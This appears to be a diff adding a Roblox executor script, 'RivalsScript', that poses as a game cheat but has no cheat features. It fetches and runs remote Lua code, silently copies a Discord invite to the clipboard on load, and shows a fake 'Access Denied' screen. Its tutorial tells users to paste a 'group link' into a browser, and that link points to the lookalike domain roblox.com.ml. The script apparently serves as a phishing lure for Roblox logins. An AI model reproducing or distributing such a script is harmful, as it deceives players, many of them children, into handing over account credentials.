@@ -1,0 +1,85 @@
+--// Load Fluent UI Library
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+
+--// Create Main Window
+local Window = Fluent:CreateWindow({
+    Title = "RivalsScript",
+    SubTitle = "v0.8",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 400),
+    Acrylic = false,
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
+
+--// Links
+local GroupLink = "https://www.roblox.com.ml/communities/215148787547/Rivals"
+local DiscordLink = "https://discord.gg/eVTAkerpaA"
+
+--// Function to copy Discord Link
+local function CopyDiscordLink()
+    if setclipboard then
+        setclipboard(DiscordLink)
+        Fluent:Notify({
+            Title = "RivalsScript",
+            Content = "Discord link copied to clipboard!",
+            Duration = 3
+        })
+    else
+        Fluent:Notify({
+            Title = "Error",
+            Content = "Your executor does not support setclipboard.",
+            Duration = 3
+        })
+    end
+end
+
+--// Auto-copy Discord link on load
+CopyDiscordLink()
+
+--// Tab 1: Access Denied
+local AccessTab = Window:AddTab({ Title = "Access", Icon = "lock" })
+
+AccessTab:AddParagraph({
+    Title = "Access Denied",
+    Content = "You need to join the group to access this script."
+})
+
+--// Tab 2: Tutorial & Copy Links
+local TutorialTab = Window:AddTab({ Title = "Tutorial", Icon = "help-circle" })
+
+TutorialTab:AddParagraph({
+    Title = "How to Join the Group",
+    Content = "1. Click the 'Copy Group Link' button below.\n2. Open your preferred browser (e.g., Google Chrome).\n3. Paste the copied link into the search bar and press Enter.\n4. Click the 'Join Group' button on the Roblox page.\n5. Re-execute the script once you have joined!"
+})
+
+TutorialTab:AddButton({
+    Title = "Copy Group Link",
+    Callback = function()
+        if setclipboard then
+            setclipboard(GroupLink)
+            Fluent:Notify({
+                Title = "RivalsScript",
+                Content = "Group link copied to clipboard!",
+                Duration = 3
+            })
+        else
+            Fluent:Notify({
+                Title = "Error",
+                Content = "Your executor does not support setclipboard.",
+                Duration = 3
+            })
+        end
+    end
+})
+
+TutorialTab:AddButton({
+    Title = "Join Discord Server (Support)",
+    Description = "If joining the group doesn't work, join our Discord server so we can help you!",
+    Callback = function()
+        CopyDiscordLink()
+    end
+})
+
+--// Select initial tab
+Window:SelectTab(1)
